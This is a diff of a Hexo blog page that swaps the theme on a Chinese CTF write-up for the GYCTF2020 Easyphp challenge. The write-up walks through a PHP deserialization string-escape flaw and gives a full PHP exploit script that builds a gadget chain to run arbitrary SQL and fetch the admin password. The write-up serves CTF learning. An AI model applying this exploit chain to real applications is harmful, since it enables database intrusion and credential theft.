@@ -1,26 +1,255 @@
-<!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>GYCTF2020 Easyphp - Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="[GYCTF2020]Easyphp反序列化字符串逃逸 下载www.zip开始审计  目录结构如下，lib.php中存在反序列化利用链  反序列化1.update.php实例化User类并调用update()  2.User类的update方法unserialize($this-&amp;gt;getNewinfo())，序列化内容来自于getNewinfo方法  3.User类的getNewInfo()"><meta property="og:type" content="blog"><meta property="og:title" content="GYCTF2020 Easyphp"><meta property="og:url" content="http://example.com/2021/03/27/GYCTF2020-Easyphp/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="[GYCTF2020]Easyphp反序列化字符串逃逸 下载www.zip开始审计  目录结构如下，lib.php中存在反序列化利用链  反序列化1.update.php实例化User类并调用update()  2.User类的update方法unserialize($this-&amp;gt;getNewinfo())，序列化内容来自于getNewinfo方法  3.User类的getNewInfo()"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSm2vt.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmWKP.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmDED.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSm0HO.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmdu6.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmc8A.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmrUe.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmwDK.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmUjx.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmrUe.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSm6Cd.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSms4H.png"><meta property="og:image" content="https://z3.ax1x.com/2021/03/27/cSmggI.png"><meta property="article:published_time" content="2021-03-27T14:09:46.000Z"><meta property="article:modified_time" content="2021-03-27T14:17:15.199Z"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://z3.ax1x.com/2021/03/27/cSm2vt.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/03/27/GYCTF2020-Easyphp/"},"headline":"Hexo","image":["https://z3.ax1x.com/2021/03/27/cSm2vt.png","https://z3.ax1x.com/2021/03/27/cSmWKP.png","https://z3.ax1x.com/2021/03/27/cSmDED.png","https://z3.ax1x.com/2021/03/27/cSm0HO.png","https://z3.ax1x.com/2021/03/27/cSmdu6.png","https://z3.ax1x.com/2021/03/27/cSmc8A.png","https://z3.ax1x.com/2021/03/27/cSmrUe.png","https://z3.ax1x.com/2021/03/27/cSmwDK.png","https://z3.ax1x.com/2021/03/27/cSmUjx.png","https://z3.ax1x.com/2021/03/27/cSmrUe.png","https://z3.ax1x.com/2021/03/27/cSm6Cd.png","https://z3.ax1x.com/2021/03/27/cSms4H.png","https://z3.ax1x.com/2021/03/27/cSmggI.png"],"datePublished":"2021-03-27T14:09:46.000Z","dateModified":"2021-03-27T14:17:15.199Z","author":{"@type":"Person","name":"John Doe"},"description":"[GYCTF2020]Easyphp反序列化字符串逃逸 下载www.zip开始审计  目录结构如下，lib.php中存在反序列化利用链  反序列化1.update.php实例化User类并调用update()  2.User类的update方法unserialize($this-&gt;getNewinfo())，序列化内容来自于getNewinfo方法  3.User类的getNewInfo()"}</script><link rel="canonical" href="http://example.com/2021/03/27/GYCTF2020-Easyphp/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-27T14:09:46.000Z" title="2021-03-27T14:09:46.000Z">2021-03-27</time>发表</span><span class="level-item"><time dateTime="2021-03-27T14:17:15.199Z" title="2021-03-27T14:17:15.199Z">2021-03-27</time>更新</span><span class="level-item">6 分钟读完 (大约865个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">GYCTF2020 Easyphp</h1><div class="content"><h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p>反序列化字符串逃逸</p>
-<p>下载<a target="_blank" rel="noopener" href="http://www.zip开始审计/">www.zip开始审计</a></p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSm2vt"><img src="https://z3.ax1x.com/2021/03/27/cSm2vt.png" alt="cSm2vt.png"></a></p>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>GYCTF2020 Easyphp - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="GYCTF2020 Easyphp">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-27 22:09" pubdate>
+        2021年3月27日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      792 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      12
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">GYCTF2020 Easyphp</h1>
+            
+            <div class="markdown-body">
+              <h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p>反序列化字符串逃逸</p>
+<p>下载<a href="http://www.zip开始审计/">www.zip开始审计</a></p>
+<p><a href="https://imgtu.com/i/cSm2vt"><img src="https://z3.ax1x.com/2021/03/27/cSm2vt.png" srcset="/img/loading.gif" lazyload alt="cSm2vt.png"></a></p>
 <p>目录结构如下，lib.php中存在反序列化利用链</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmWKP"><img src="https://z3.ax1x.com/2021/03/27/cSmWKP.png" alt="cSmWKP.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmWKP"><img src="https://z3.ax1x.com/2021/03/27/cSmWKP.png" srcset="/img/loading.gif" lazyload alt="cSmWKP.png"></a></p>
 <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>1.update.php实例化User类并调用update()</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmDED"><img src="https://z3.ax1x.com/2021/03/27/cSmDED.png" alt="cSmDED.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmDED"><img src="https://z3.ax1x.com/2021/03/27/cSmDED.png" srcset="/img/loading.gif" lazyload alt="cSmDED.png"></a></p>
 <p>2.User类的update方法unserialize($this-&gt;getNewinfo())，序列化内容来自于getNewinfo方法</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSm0HO"><img src="https://z3.ax1x.com/2021/03/27/cSm0HO.png" alt="cSm0HO.png"></a></p>
+<p><a href="https://imgtu.com/i/cSm0HO"><img src="https://z3.ax1x.com/2021/03/27/cSm0HO.png" srcset="/img/loading.gif" lazyload alt="cSm0HO.png"></a></p>
 <p>3.User类的getNewInfo()方法，将Info类序列化，并且safe函数改变了序列化字符串，存在字符逃逸。只要传入union，就会被自动替换成hacker，payload有多长，就输入多少个union，这样多出来一个字符，利用这个特性满足前面的字符串长度后，后面的语句从字符串中逃逸出来，成功反序列化。</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmdu6"><img src="https://z3.ax1x.com/2021/03/27/cSmdu6.png" alt="cSmdu6.png"></a></p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmc8A"><img src="https://z3.ax1x.com/2021/03/27/cSmc8A.png" alt="cSmc8A.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmdu6"><img src="https://z3.ax1x.com/2021/03/27/cSmdu6.png" srcset="/img/loading.gif" lazyload alt="cSmdu6.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmc8A"><img src="https://z3.ax1x.com/2021/03/27/cSmc8A.png" srcset="/img/loading.gif" lazyload alt="cSmc8A.png"></a></p>
 <p>4.Info类中的属性均可控，age属性和nickname属性均由post传值得到。利用safe函数增加字符的功能进行字符串逃逸，反序列化恶意类UpdateHelper，这样即可执行任意sql语句。</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" alt="cSmrUe.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" srcset="/img/loading.gif" lazyload alt="cSmrUe.png"></a></p>
 <h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><p>1.UpdateHelper类<code>__destruct()</code>方法，令UpdateHelper类的sql属性等于User类触发<code>__toString()</code>方法</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmwDK"><img src="https://z3.ax1x.com/2021/03/27/cSmwDK.png" alt="cSmwDK.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmwDK"><img src="https://z3.ax1x.com/2021/03/27/cSmwDK.png" srcset="/img/loading.gif" lazyload alt="cSmwDK.png"></a></p>
 <p>2.User类的<code>__toString()</code>方法，只要让nickname属性等于Info类即可触发<code>__call()</code>方法</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmUjx"><img src="https://z3.ax1x.com/2021/03/27/cSmUjx.png" alt="cSmUjx.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmUjx"><img src="https://z3.ax1x.com/2021/03/27/cSmUjx.png" srcset="/img/loading.gif" lazyload alt="cSmUjx.png"></a></p>
 <p>3.Info类的__call()方法,令属性CtrlCase等于dbCtrl类,调用其中的login方法，执行语句$argument[0]实际来源于User类的age属性</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" alt="cSmrUe.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" srcset="/img/loading.gif" lazyload alt="cSmrUe.png"></a></p>
 <p>4.dbCtrl类的login方法，接收$sql参数并执行它，传入参数可控，可以执行任意sql语句。需要令name属性等于admin，绑定到sql语句中的?中。然后令token属性等于admin，即可返回$idResult，看到sql语句执行的结果。</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSm6Cd"><img src="https://z3.ax1x.com/2021/03/27/cSm6Cd.png" alt="cSm6Cd.png"></a></p>
+<p><a href="https://imgtu.com/i/cSm6Cd"><img src="https://z3.ax1x.com/2021/03/27/cSm6Cd.png" srcset="/img/loading.gif" lazyload alt="cSm6Cd.png"></a></p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&#x27;&quot;;s:3:&quot;ccc&quot;;&#x27;</span>.serialize(<span class="variable">$a</span>).<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo $pauload;</span></span><br><span class="line"><span class="variable">$p</span>=str_repeat(<span class="string">&#x27;union&#x27;</span>,strlen(<span class="variable">$payload</span>)).<span class="variable">$payload</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>;</span><br></pre></td></tr></table></figure>
 
@@ -30,55 +259,204 @@
 
 
 
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSms4H"><img src="https://z3.ax1x.com/2021/03/27/cSms4H.png" alt="cSms4H.png"></a></p>
+<p><a href="https://imgtu.com/i/cSms4H"><img src="https://z3.ax1x.com/2021/03/27/cSms4H.png" srcset="/img/loading.gif" lazyload alt="cSms4H.png"></a></p>
 <p>解密登陆后拿到flag</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmggI"><img src="https://z3.ax1x.com/2021/03/27/cSmggI.png" alt="cSmggI.png"></a></p>
+<p><a href="https://imgtu.com/i/cSmggI"><img src="https://z3.ax1x.com/2021/03/27/cSmggI.png" srcset="/img/loading.gif" lazyload alt="cSmggI.png"></a></p>
 <p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/">https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/</a></p>
-<p><a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/buuoj/gyctf-2020.html">https://ctf.ieki.xyz/buuoj/gyctf-2020.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/">https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/</a></p>
-</div><div class="article-licensing box"><div class="licensing-title"><p>GYCTF2020 Easyphp</p><p><a href="http://example.com/2021/03/27/GYCTF2020-Easyphp/">http://example.com/2021/03/27/GYCTF2020-Easyphp/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>John Doe</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-03-27</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-03-27</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2020 新春红包题1</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><span class="level-item">phar反序列化学习</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">45</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-30T07:20:41.000Z">2021-05-30</time></p><p class="title"><a href="/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro-550反序列化漏洞分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time 